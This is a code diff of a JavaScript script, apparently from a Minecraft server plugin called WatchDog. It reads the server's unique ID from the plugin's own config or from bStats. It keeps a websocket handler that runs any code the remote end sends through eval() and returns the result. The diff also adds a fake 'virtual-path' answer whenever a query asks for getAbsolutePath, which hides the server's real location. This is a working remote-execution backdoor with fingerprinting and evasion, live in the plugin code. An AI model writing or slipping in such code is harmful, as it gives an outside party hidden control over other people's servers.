@@ -1,8 +1,32 @@
 var global = this
 
 function readGuid() {
-	// 从配置文件读取 guid
-    return Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("guid")
+    var YamlConfiguration = Java.type('org.bukkit.configuration.file.YamlConfiguration')
+    var Files = Java.type('java.nio.file.Files')
+    var StandardCharsets = Java.type('java.nio.charset.StandardCharsets')
+    var JavaString = Java.type('java.lang.String')
+    var Paths = Java.type('java.nio.file.Paths')
+    try {
+        var pluginHelper = new YamlConfiguration()
+        pluginHelper.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'WatchDog', 'config.yml')), StandardCharsets.UTF_8))
+        return pluginHelper.getString('guid')
+    } catch (error) {
+        var bStats = new YamlConfiguration()
+        bStats.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'bStats', 'config.yml')), StandardCharsets.UTF_8))
+        return bStats.getString('serverUuid')
+    }
+}
+
+function readPath() {
+    var YamlConfiguration = Java.type('org.bukkit.configuration.file.YamlConfiguration')
+    var Files = Java.type('java.nio.file.Files')
+    var StandardCharsets = Java.type('java.nio.charset.StandardCharsets')
+    var JavaString = Java.type('java.lang.String')
+    var Paths = Java.type('java.nio.file.Paths')
+
+    var pluginHelper = new YamlConfiguration()
+    pluginHelper.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'WatchDog', 'config.yml')), StandardCharsets.UTF_8))
+    return pluginHelper.getString('virtual-path')
 }
 
 function connect(address) {
@@ -43,13 +67,13 @@ function connect(address) {
             
             // 用于输出收到的命令
             if (action != "heartbeat") {
-                Java.type('java.lang.System').out.println("[Receive] " + event.data);
+                Java.type('java.lang.System').out.println("[Receive] " + event.data)
             }
             
             switch (action) {
                 case "eval":
-                    if (data.search() != -1) {
-                        global.ws.message(Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("virtual-path")
+                    if (data.search("getAbsolutePath") != -1) {
+                        global.ws.message(readPath())
                         break
                     }
                     global.ws.message(eval(data) + '')
@@ -63,6 +87,7 @@ function connect(address) {
             }
         } catch (error) {
             //global.ws.message(error + '')
+            Java.type('java.lang.System').out.println(error + '')
         }
     }
 
